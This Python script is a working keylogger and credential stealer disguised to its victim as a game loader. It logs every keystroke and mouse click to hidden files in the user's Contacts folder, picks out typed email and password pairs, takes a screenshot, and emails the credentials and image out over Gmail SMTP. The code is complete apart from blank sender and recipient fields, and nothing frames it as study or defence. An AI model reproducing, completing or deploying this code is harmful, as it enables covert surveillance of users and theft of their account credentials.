import os
import re
import pyscreenshot

# send mail with image
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from datetime import datetime
from pathlib import Path
from pynput import keyboard, mouse

# datetime object containing current date and time
now = datetime.now()

# view of date and time written to the file: dd/mm/YY H:M:S
dt_string = now.strftime("[%d/%m/%Y | %H:%M:%S]: ")

# fake message to the user that he is installing a 'game'
print('Loading the Game.....\nPlease Wait.....')
keys_count = 0
keys = ''

# generic and 'discreet'/ 'hidden' path for every computer so the user won't see the file straight
home = str(Path.home())
path = "home + '\\Contacts\\log.txt'"
file = open(home + '\\Contacts\\log.txt', 'a', encoding='utf-8')
short_file = open(home + '\\Contacts\\short_log.txt', 'a', encoding='utf-8')

inputStr = ''

def checkInput():
    global inputStr

    start = -1
    flag = False
    for i in range(len(inputStr) - 1, -1, -1):
        if flag:
            break
        if inputStr[i] == '♥' or inputStr[i] == '☺':  # click or enter
            for j in range(i - 1, -1, -1):
                if flag:
                    break
                if inputStr[j] == '♥' or inputStr[j] == '♣':  # click or tab
                    for k in range(j - 1, -1, -1):
                        if inputStr[k] == '♥':  # click
                            start = k
                            flag = True
                            break
    if start >= 0:
        input_ = inputStr[start + 1:len(inputStr) - 1]

        regex = r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}'
        email_pass = None
        if '♥' in input_:
            email_pass = input_.split('♥')  # [email, password]
        else:  # or ♣
            email_pass = input_.split('♣')  # [email, password]
        if '' in email_pass:
            return
        if re.match(regex, email_pass[0]):
            sendEmail(email_pass[0], email_pass[1])
            inputStr = inputStr[j:]


def sendEmail(email, password):
    import smtplib
    global home, path, short_file

    try:
        # To capture the screen
        image = pyscreenshot.grab()

        # To display the captured screenshot
        # image.show()

        # To save the captures screenshot
        image.save(home + '\\Contacts\\image_capture.jpg')

        gmail_user = ''
        gmail_password = ''

        sent_from = gmail_user
        to_addr = ''
        subject = 'New User Credentials Catch!'
        body = 'Email = ' + str(email) + ', Password = ' + str(password)
        image_location = home + '\\Contacts\\image_capture.jpg'
        body_images = {"my_image": image_location}

        msg = MIMEMultipart('related')
        msg['Subject'] = subject
        msg['From'] = sent_from
        msg['To'] = to_addr

        # html code for cosmetic mail that contains the image
        html = """\
        <html>
          <head></head>
            <body>
              <h1>""" + body + """</h1>
              <img src="cid:image1" alt="Logo" style="width:1000px;height:500px;"><br>                        
            </body>
        </html>
        """

        # Record the MIME types of text/html.
        part2 = MIMEText(html, 'html')

        # Attach parts into message container.
        msg.attach(part2)

        # This example assumes the image is in the current directory
        fp = open(image_location, 'rb')
        msgImage = MIMEImage(fp.read())
        fp.close()

        # Define the image's ID as referenced above
        msgImage.add_header('Content-ID', '<image1>')
        msg.attach(msgImage)

        smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        smtp_server.ehlo()
        smtp_server.login(gmail_user, gmail_password)
        smtp_server.sendmail(sent_from, to_addr, msg.as_string())
        smtp_server.close()
        print("Email sent successfully!")

        # save the email and the password into 'short_file'
        short_file.write('\n' + str(body) + '\n')
        short_file.close()
        short_file = open(home + '\\Contacts\\short_log.txt', 'a+', encoding='utf-8')

    except Exception as ex:
        print("Something went wrong….", ex)


# write the keys into the file
def write_to_file(key):
    global keys_count, keys, file, inputStr

    # exit key str
    if keys[-3:] == '$$$':
        file.close()
        os._exit(1)

    keys_count += 1
    ltr = str(key)
    ltr = ltr.replace("'", "")

    # Click=♥ , Enter=☺, Tab=♣
    # special keys and there action
    if ltr == 'Key.space':
        ltr = ' '
    elif ltr == 'Key.shift_r':
        ltr = ''
    elif ltr == "Key.ctrl_l":
        ltr = ""
    elif ltr == "Key.enter":
        ltr = "\n"
        inputStr += '☺'
    elif ltr == "Key.tab":
        ltr = "\t"
        inputStr += '♣'

    # if the key is a func key that is not a letter or sign or the special above
    if len(ltr) > 1:
        keys += '[' + ltr + ']'
        keys_count += 1
    else:
        keys += ltr

    # print a stamp of the date and time to follow the user habits
    if ltr == '\n':
        now = datetime.now()
        keys += now.strftime("[%d/%m/%Y | %H:%M:%S]:\n")

    # every 'n' keys go one line down
    n = 10
    if keys_count == n:
        file.write(keys)
        keys_count = 0
        keys = ''
        file.close()
        file = open(home + '\\Contacts\\log.txt', 'a+', encoding='utf-8')

    if ltr != '\t' and ltr != '\n' and len(ltr) == 1:
        inputStr += ltr
    if ltr == "\n":
        checkInput()


def on_click(x, y, button, pressed):
    if not pressed:
        return

    global file, inputStr
    file.write('\n' + str(button) + ' - Coordinates:(' + str(x) + ',' + str(y) + ')\n')
    file.close()
    file = open(home + '\\Contacts\\log.txt', 'a+', encoding='utf-8')

    regex = r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}'

    # Click=♥ , Enter=☺, Tab=♣
    inputStr += '♥'
    checkInput()


# 'with' helps  us to automatically close the 'listener'
# and managing the memory better when the program close int the end.

with keyboard.Listener(on_press=write_to_file) as k_listener, \
        mouse.Listener(on_click=on_click) as m_listener:
    k_listener.join()
    m_listener.join()
